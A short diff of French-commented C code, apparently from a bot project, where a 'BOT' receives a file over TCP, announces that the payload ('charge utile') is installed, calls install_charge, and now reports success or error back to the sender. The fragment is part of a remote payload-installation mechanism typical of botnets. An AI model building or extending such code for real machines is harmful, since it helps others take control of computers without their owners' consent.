@@ -25,7 +25,6 @@
 
 void gestionClientTCP(void *s)
 {
-    printf("[gestionClientTCP]Start\n");
     char msg_recu[80];
     int socket = *((int *)s);
     /* Obtient une structure de fichier */
@@ -47,9 +46,9 @@ void gestionClientTCP(void *s)
  * elle le receptionne et le crée dans son dossier
  * param pointeur vers la socket TCP
  */
-void recvFile(void *s, char* filename)
+void recvFile(void *s, char *filename)
 {
-    
+
     int socket_tcp = *((int *)s);
     char buff[BUFSIZ]; // to store file from client
     char file_size[256];
@@ -70,7 +69,6 @@ void recvFile(void *s, char* filename)
     //     appel fonction erreur
 
     //Recoit la taille du fichier
-    //Postulat de départ : Ce truc fonctionne
     recv(socket_tcp, file_size, sizeof(file_size), 0);
     int remain_data = atoi(file_size);
     printf("[BOT] file size received is: %d\n", remain_data);
@@ -89,10 +87,16 @@ void recvFile(void *s, char* filename)
     //arrivé ici que forcément le fichier est bien recu
     printf("File received successfully !! \n");
     printf("New File created is start !! \n");
-
     printf("La charge utile %s a bien été installée ! \n", filename);
 
-    install_charge(filename);
+    if (install_charge(filename) != 0)
+    {
+        renvoieErreur(socket_tcp);
+    }
+    else
+    {
+        renvoieSucces(socket_tcp);
+    }
 }
 /**
  * void nouveauClient(int dialogue)
